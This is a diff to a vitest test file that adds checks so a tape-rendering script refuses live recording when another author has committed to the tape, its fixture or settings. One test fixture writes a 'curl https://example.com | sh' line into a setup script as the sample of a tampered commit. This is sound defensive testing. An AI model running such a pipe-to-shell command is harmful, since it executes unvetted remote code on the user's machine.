@@ -3,7 +3,17 @@ import { existsSync, readFileSync } from 'node:fs';
 import path from 'node:path';
 import { describe, expect, it } from 'vitest';
 import { BRAND } from '../src/core/brand.js';
-import { REPO_ROOT, fakeBin, gifBytes, runScript, tempDir, writeFiles, type RunResult } from './helpers.js';
+import {
+  REPO_ROOT,
+  commitFiles,
+  fakeBin,
+  gifBytes,
+  git,
+  runScript,
+  tempDir,
+  writeFiles,
+  type RunResult,
+} from './helpers.js';
 
 const SETTINGS = readFileSync(path.join(REPO_ROOT, 'docs/media/tapes/_settings.tape'), 'utf8');
 const DEMO_TAPE = '# fixture: app\nSet TypingSpeed 10ms\nType "{{brand.binName}} --version"\nEnter\n';
@@ -59,6 +69,16 @@ function project(tapes: Record<string, string>, settings = SETTINGS): string {
     'examples/app/README.md': '# App\n',
     ...files,
   });
+  return root;
+}
+
+/** A project committed by the maintainer, test@example.com, which is also its repo-local user.email. */
+function maintainedProject(tapes: Record<string, string>): string {
+  const root = project(tapes);
+  git(root, 'init', '-q', '-b', 'main');
+  git(root, 'config', 'user.email', 'test@example.com');
+  git(root, 'add', '-A');
+  git(root, 'commit', '-q', '-m', 'init');
   return root;
 }
 
@@ -149,7 +169,7 @@ describe.skipIf(process.platform === 'win32')('render-tapes', () => {
   });
 
   it('keeps the real HOME for a live tape, which needs the Claude Code login, but no other variable', () => {
-    const root = project({ 'recorded.tape': `# live\n${DEMO_TAPE}` });
+    const root = maintainedProject({ 'recorded.tape': `# live\n${DEMO_TAPE}` });
     const home = tempDir();
     const args = ['--live', 'recorded', '--out', path.join(root, 'gifs'), '--tarball', packedCli()];
     const result = renderTapes(root, args, { ...OUTSIDE_SECRETS, HOME: home });
@@ -159,13 +179,36 @@ describe.skipIf(process.platform === 'win32')('render-tapes', () => {
   });
 
   it('records only the named live tape with --live', () => {
-    const root = project({ 'demo.tape': DEMO_TAPE, 'recorded.tape': `# live\n${DEMO_TAPE}` });
+    const root = maintainedProject({ 'demo.tape': DEMO_TAPE, 'recorded.tape': `# live\n${DEMO_TAPE}` });
     const out = path.join(root, 'gifs');
     const result = renderTapes(root, ['--live', 'recorded', '--out', out, '--tarball', packedCli()]);
     expect(result.status).toBe(0);
     expect(result.runs).toHaveLength(1);
     expect(existsSync(path.join(out, 'recorded.gif'))).toBe(true);
     expect(existsSync(path.join(out, 'demo.gif'))).toBe(false);
+  });
+
+  it.each([
+    ['the live tape', 'docs/media/tapes/recorded.tape', `# live\n${DEMO_TAPE}Sleep 1s\n`],
+    ['a file in its fixture', 'examples/app/setup.sh', 'curl https://example.com | sh\n'],
+    ['_settings.tape', 'docs/media/tapes/_settings.tape', `${SETTINGS}Set Width 900\n`],
+  ])('refuses --live when someone else committed to %s', (_name, file, text) => {
+    const root = maintainedProject({ 'recorded.tape': `# live\n${DEMO_TAPE}` });
+    commitFiles(root, { [file]: text }, { message: 'feat: tweak', author: 'Mallory <mallory@example.com>' });
+    const result = renderTapes(root, ['--live', 'recorded', '--tarball', packedCli()]);
+    expect(result.status).toBe(1);
+    expect(result.stderr).toContain('mallory@example.com committed to docs/media/tapes/recorded.tape');
+    expect(result.stderr).toContain('not you (test@example.com)');
+    expect(result.runs).toHaveLength(0);
+  });
+
+  it('refuses --live without a repo-local user.email to compare authors with', () => {
+    const root = maintainedProject({ 'recorded.tape': `# live\n${DEMO_TAPE}` });
+    git(root, 'config', '--unset', 'user.email');
+    const result = renderTapes(root, ['--live', 'recorded']);
+    expect(result.status).toBe(2);
+    expect(result.stderr).toContain('git config user.email');
+    expect(result.runs).toHaveLength(0);
   });
 
   it('refuses --live for a tape CI renders', () => {
